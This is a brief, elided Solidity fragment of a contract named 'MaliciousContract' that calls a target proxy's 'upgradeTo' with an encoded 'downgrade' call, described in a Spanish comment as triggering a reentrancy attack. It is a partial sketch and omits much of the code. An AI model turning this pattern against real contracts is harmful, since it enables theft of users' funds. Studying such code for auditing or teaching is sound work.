...
interface SETHProxy {
    function upgradeTo(address to, uint256 wad, bytes calldata data) external;
...
contract MaliciousContract {
    ...
    function initiateAttack() private {
        // Enviar tokens al contrato objetivo para activar el ataque de reentrancia
        bytes memory data = abi.encodeWithSignature("downgrade(uint256)", 1 ether);
        target.upgradeTo(address(this), 2 ether, data);
